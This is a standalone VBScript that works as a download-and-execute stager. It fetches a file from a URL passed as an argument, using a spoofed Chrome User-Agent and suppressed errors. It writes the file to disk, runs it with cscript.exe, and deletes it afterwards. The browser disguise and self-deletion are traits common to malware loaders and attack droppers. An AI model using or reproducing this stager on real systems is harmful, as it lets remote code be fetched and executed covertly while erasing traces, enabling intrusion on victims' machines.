Dim Param1, Param2, objFSO, objRun, varScript
Set Param1 = Wscript.Arguments

' Verify 2 arguments were given
if wscript.arguments.count = 3 then	

' First parameter is site to download script
' Second parameter is the folder to be created Example: c:\testing\  NOTE** End with \
' Third parameter is the name of the file downloaded
Arg1 = Param1(0)
Arg2 = Param1(1)
Arg3 = Param1(2)
	
' Create FileObject 
Set fso = CreateObject("Scripting.FileSystemObject")
Set Outp = Wscript.Stdout
On Error Resume Next
Set File = WScript.CreateObject("Microsoft.XMLHTTP")
File.Open "GET", Arg1, False
File.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
File.Send
If err.number <> 0 then 
	WScript.Quit 1
End If

' Set folder object and check to see if folder exists
Set objFSO = CreateObject("Scripting.FileSystemObject")

if objFSO.FolderExists(Arg2) then
	WScript.Sleep(100)
Else
	Set objFolder = objFSO.CreateFolder(Arg2)
	on error GoTo 0
End If

Set BS = CreateObject("ADODB.Stream")
BS.type = 1
BS.open
BS.Write File.ResponseBody
BS.SaveToFile Arg2 & "\" & Arg3, 2
'Sleep 5 seconds
WScript.Sleep(5000)

'Run our downloaded script
varScript = Arg2 & "\" & Arg3
Set objrun = Wscript.CreateObject("WScript.Shell")
objRun.run "%SystemRoot%\system32\cscript.exe //E:VBScript " & varScript,1, True

'Delete our script
FSO.DeleteFile(varScript)

set Arg1 = Nothing
set Arg2 = Nothing
set Arg3 = Nothing
set objrun = Nothing

else
	wscript.quit 1
end if
